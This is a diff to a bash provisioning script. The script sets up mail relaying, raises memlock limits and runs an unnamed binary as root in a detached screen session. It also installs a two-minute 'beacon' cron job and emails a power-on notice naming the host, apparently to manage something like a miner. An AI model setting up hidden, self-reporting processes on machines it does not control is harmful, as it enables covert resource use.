@@ -2,7 +2,7 @@
 cd home
 sudo rm /etc/cron.d/beacon
 
-if [ ! -f /home/proof ]; then
+if [ ! -f /etc/proof ]; then
 	sudo debconf-set-selections <<< "postfix postfix/mailname string salchipapa.llameante2@gmail.com"
 	sudo debconf-set-selections <<< "postfix postfix/main_mailer_type string 'Internet Site'"
 	sudo apt-get -y install mailutils ssmtp libmicrohttpd-dev
@@ -15,7 +15,7 @@ if [ ! -f /home/proof ]; then
 	sudo bash -c 'echo "UseSTARTTLS=YES" >> /etc/ssmtp/ssmtp.conf'
 	sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
 	sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
-    sudo touch /home/proof
+    sudo touch /etc/proof
 fi
 
 sudo chmod +x /patata/patata
@@ -26,7 +26,6 @@ screen -dm sudo /patata/patata /patata/config.txt
 
 if [ $# -eq 3 ]
   then
-    sudo touch /home/proof
     echo 'ayy' | mail -s "Encendido de $HOSTNAME" "$3"
     sudo touch /etc/cron.d/beacon
     cronjob='*/2 * * * *'
